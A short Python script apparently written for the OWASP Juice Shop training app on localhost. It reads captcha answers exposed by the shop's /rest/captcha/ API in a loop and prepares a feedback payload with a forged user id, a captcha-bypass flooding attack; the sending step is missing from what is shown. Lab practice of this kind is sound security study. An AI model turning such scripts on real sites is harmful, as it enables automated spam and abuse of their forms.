import requests

myobj={"UserId":2,"captchaId":0,"captcha":"","comment":"site heheheheh (***@juice-sh.op)","rating":0}
url = "http://127.0.0.1:3000/api/Feedbacks/"


while True:
    x = requests.get("http://localhost:3000/rest/captcha/")
    newcaptcha = x.json()
    currid = newcaptcha["captchaId"]
    ans = newcaptcha["answer"]
    cap = newcaptcha["captcha"]
    if currid%1000==0:
        print(f"{currid}. {cap} = {ans}")

